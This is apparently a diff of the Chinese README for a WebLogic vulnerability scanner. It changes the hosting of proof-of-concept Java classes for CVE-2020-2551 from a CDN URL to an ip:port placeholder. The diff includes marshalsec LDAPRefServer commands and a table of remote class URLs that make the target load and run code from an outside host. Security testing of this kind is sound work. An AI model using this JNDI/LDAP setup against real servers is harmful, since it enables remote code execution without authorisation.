@@ -36,21 +36,27 @@ weblogic-framework is the best tool for detecting weblogic vulnerabilities.
  */
 ```
 
+**将 POC 目录中文件上传至 HTTP 服务中，或者上传至静态可访问目录，也可以上传至CDN等。**
+
+```
+python3 -m http.server 80
+```
+
 远程提供 POC 如下：
 
 | URL                                                                                | LDAP 设置地址                                                                  | 回显类                              | 备注                                    |
 |:-----------------------------------------------------------------------------------|:------------------------------------------------------------------------------|:-----------------------------------|:---------------------------------------|
-| http://qch7ecs9e.bkt.clouddn.com/PocServerClusterMasterRemote.class                | http://qch7ecs9e.bkt.clouddn.com/#PocServerClusterMasterRemote                | ClusterMasterRemote                | ClusterMasterRemote 回显（默认）         |
-| http://qch7ecs9e.bkt.clouddn.com/PocServerRemoteChannelService.class               | http://qch7ecs9e.bkt.clouddn.com/#PocServerRemoteChannelService               | RemoteChannelService               | ClusterMasterRemote 回显                |
-| http://qch7ecs9e.bkt.clouddn.com/PocServerRemoteLeasingBasis.class                 | http://qch7ecs9e.bkt.clouddn.com/#PocServerRemoteLeasingBasis                 | RemoteLeasingBasis                 | RemoteLeasingBasis 回显                 |
-| http://qch7ecs9e.bkt.clouddn.com/PocServerRemoteMigratableServiceCoordinator.class | http://qch7ecs9e.bkt.clouddn.com/#PocServerRemoteMigratableServiceCoordinator | RemoteMigratableServiceCoordinator | RemoteMigratableServiceCoordinator 回显 |
-| http://qch7ecs9e.bkt.clouddn.com/PocServerSingletonMonitorRemote.class             | http://qch7ecs9e.bkt.clouddn.com/#PocServerSingletonMonitorRemote             | SingletonMonitorRemote             | SingletonMonitorRemote 回显             |
-| http://qch7ecs9e.bkt.clouddn.com/PocServerSubCoordinatorRM.class                   | http://qch7ecs9e.bkt.clouddn.com/#PocServerSubCoordinatorRM                   | SubCoordinatorRM                   | SubCoordinatorRM 回显                   |
+| http://ip:port/PocServerClusterMasterRemote.class                | http://ip:port/#PocServerClusterMasterRemote                | ClusterMasterRemote                | ClusterMasterRemote 回显（默认）         |
+| http://ip:port/PocServerRemoteChannelService.class               | http://ip:port/#PocServerRemoteChannelService               | RemoteChannelService               | ClusterMasterRemote 回显                |
+| http://ip:port/PocServerRemoteLeasingBasis.class                 | http://ip:port/#PocServerRemoteLeasingBasis                 | RemoteLeasingBasis                 | RemoteLeasingBasis 回显                 |
+| http://ip:port/PocServerRemoteMigratableServiceCoordinator.class | http://ip:port/#PocServerRemoteMigratableServiceCoordinator | RemoteMigratableServiceCoordinator | RemoteMigratableServiceCoordinator 回显 |
+| http://ip:port/PocServerSingletonMonitorRemote.class             | http://ip:port/#PocServerSingletonMonitorRemote             | SingletonMonitorRemote             | SingletonMonitorRemote 回显             |
+| http://ip:port/PocServerSubCoordinatorRM.class                   | http://ip:port/#PocServerSubCoordinatorRM                   | SubCoordinatorRM                   | SubCoordinatorRM 回显                   |
 
 1. 启动 LDAP 服务
 
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://qch7ecs9e.bkt.clouddn.com/#PocServerClusterMasterRemote 1099
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:port/#PocServerClusterMasterRemote 1099
 ```
 
 2. 配置 LDAP 地址：
@@ -163,7 +169,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 验证 CVE-2020-2551 时必须要使用的配置项，默认情况下不会进行配置需要自行开启 LDAP 服务，利用的 EXP 默认存储在 poc 目录中（在手册中附带远程的地址，使用时可直接指向远程地址），开启 LDAP 服务可通过 marshalsec 进行启动，以下为详细的启动命令：
 
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://qch7ecs9e.bkt.clouddn.com/#PocServerClusterMasterRemote 1099
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:port/#PocServerClusterMasterRemote 1099
 ```
 
 #### 漏洞编号
